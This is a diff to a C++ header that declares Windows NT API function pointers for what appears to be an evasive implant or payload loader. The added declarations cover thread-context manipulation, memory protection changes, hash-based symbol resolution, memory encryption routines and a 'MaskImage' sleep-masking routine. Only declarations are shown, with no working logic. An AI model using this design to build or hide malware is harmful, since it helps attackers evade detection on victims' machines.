@@ -33,6 +33,22 @@ struct WIN32_API {
             _In_opt_ PLARGE_INTEGER Timeout
          );
 
+        NTSTATUS(NTAPI* NtSignalAndWaitForSingleObject)(
+            _In_ HANDLE SignalHandle,
+            _In_ HANDLE WaitHandle,
+            _In_ BOOLEAN Alertable,
+            _In_opt_ PLARGE_INTEGER Timeout
+         );
+
+        NTSTATUS(NTAPI* RtlRegisterWait)(
+            _Out_ PHANDLE WaitHandle,
+            _In_ HANDLE Handle,
+            _In_ WAITORTIMERCALLBACKFUNC Function,
+            _In_opt_ PVOID Context,
+            _In_ ULONG Milliseconds,
+            _In_ ULONG Flags
+         );
+
         NTSTATUS(NTAPI* NtCreateEvent)(
             _Out_ PHANDLE EventHandle,
             _In_ ACCESS_MASK DesiredAccess,
@@ -41,9 +57,53 @@ struct WIN32_API {
             _In_ BOOLEAN InitialState
          );
 
+        NTSTATUS(NTAPI* NtResumeThread)(
+            _In_ HANDLE ThreadHandle,
+            _Out_opt_ PULONG PreviousSuspendCount
+         );
+
+        NTSTATUS(NTAPI* NtSuspendThread)(
+            _In_ HANDLE ThreadHandle,
+            _Out_opt_ PULONG PreviousSuspendCount
+         );
+
+        NTSTATUS(NTAPI* NtOpenThread)(
+            _Out_ PHANDLE ThreadHandle,
+            _In_ ACCESS_MASK DesiredAccess,
+            _In_ POBJECT_ATTRIBUTES ObjectAttributes,
+            _In_opt_ PCLIENT_ID ClientId
+         );
+
+        NTSTATUS(NTAPI* NtQuerySystemInformation)(
+            _In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
+            _Inout_ PVOID SystemInformation,
+            _In_ ULONG SystemInformationLength,
+            _Out_opt_ PULONG ReturnLength
+         );
+
         NTSTATUS(NTAPI* NtSetEvent)(
             _In_ HANDLE EventHandle,
             _Out_opt_ PLONG PreviousState
+         );
+
+        NTSTATUS(NTAPI* NtGetContextThread)(
+            _In_ HANDLE ThreadHandle,
+            _Inout_ PCONTEXT ThreadContext
+         );
+
+        NTSTATUS(NTAPI* NtSetContextThread)(
+            _In_ HANDLE ThreadHandle,
+            _In_ PCONTEXT ThreadContext
+         );
+
+        NTSTATUS(NTAPI* NtDuplicateObject)(
+            _In_ HANDLE SourceProcessHandle,
+            _In_ HANDLE SourceHandle,
+            _In_opt_ HANDLE TargetProcessHandle,
+            _Out_opt_ PHANDLE TargetHandle,
+            _In_ ACCESS_MASK DesiredAccess,
+            _In_ ULONG HandleAttributes,
+            _In_ ULONG Options
          );
 
         BOOLEAN(NTAPI* RtlAddFunctionTable)(
@@ -58,6 +118,10 @@ struct WIN32_API {
 
         VOID(NTAPI* RtlAcquireSRWLockExclusive)(
             _Inout_ PRTL_SRWLOCK SRWLock
+         );
+
+        VOID(NTAPI* RtlCaptureContext)(
+            _Out_ PCONTEXT ContextRecord
          );
 
         VOID(NTAPI* RtlReleaseSRWLockExclusive)(
@@ -81,6 +145,7 @@ struct WIN32_API {
             _Out_ PUNWIND_HISTORY_TABLE HistoryTable
          );
 
+        PVOID NtContinue;
     } Nt;
 
     struct {
@@ -95,6 +160,28 @@ struct WIN32_API {
 
         HMODULE(WINAPI* GetModuleHandleW)(
             _In_opt_ LPCWSTR lpModuleName
+         );
+
+        BOOL(WINAPI* HeapWalk)(
+            _In_ HANDLE hHeap,
+            _Inout_ LPPROCESS_HEAP_ENTRY lpEntry
+         );
+
+        DWORD(WINAPI* WaitForSingleObjectEx)(
+            _In_ HANDLE hHandle,
+            _In_ DWORD dwMilliseconds,
+            _In_ BOOL bAlertable
+         );
+
+        BOOL(WINAPI* VirtualProtect)(
+            _In_ LPVOID lpAddress,
+            _In_ SIZE_T dwSize,
+            _In_ DWORD flNewProtect,
+            _Out_ PDWORD lpflOldProtect
+         );
+
+        BOOL(WINAPI* SetEvent)(
+            _In_ HANDLE hEvent
          );
 
     } K32;
@@ -124,10 +211,15 @@ struct WIN32_API {
         PVOID SystemFunction032;
     } AdvApi32;
 
+    struct {
+        PVOID SystemFunction040;
+        PVOID SystemFunction041;
+    } CryptBase;
 };
 
-/* Global Object */
+/* Global Objects */
 inline WIN32_API g_Win32{};
+inline HANDLE g_PayloadReady = nullptr;
 
 /* External assembly functions */
 extern "C" ULONG_PTR CaptureStackPointer();
@@ -139,6 +231,10 @@ extern "C" ULONG_PTR ShadowGate(
     _In_ PSHADOWGATE_PARAMS pShadowParams
 );
 extern "C" ULONG_PTR ShadowGateEnd();
+extern "C" ULONG_PTR ShieldedRead(
+    _In_ ULONG_PTR uTarget,
+    _In_opt_ ULONG_PTR uGadget
+);
 
 /*================================================
 @ Function Pointers
@@ -149,7 +245,7 @@ namespace Resolver {
     PVOID LdrGetModuleByHash(
         _In_ ULONG uModuleHash
     );
-    PVOID LdrGetSymbolByHash(
+    PVOID LdrShieldedSymbolResolveByHash(
         _In_ PVOID pModule,
         _In_ ULONG uFunctionHash
     );
@@ -351,5 +447,10 @@ namespace Proxy {
         OUT PULONG OldProtection
     );
 }
+
+/* From Zilean.cpp */
+VOID MaskImage(
+    _In_ DWORD dwTimeout
+);
 
 #endif /* COMMON.H */
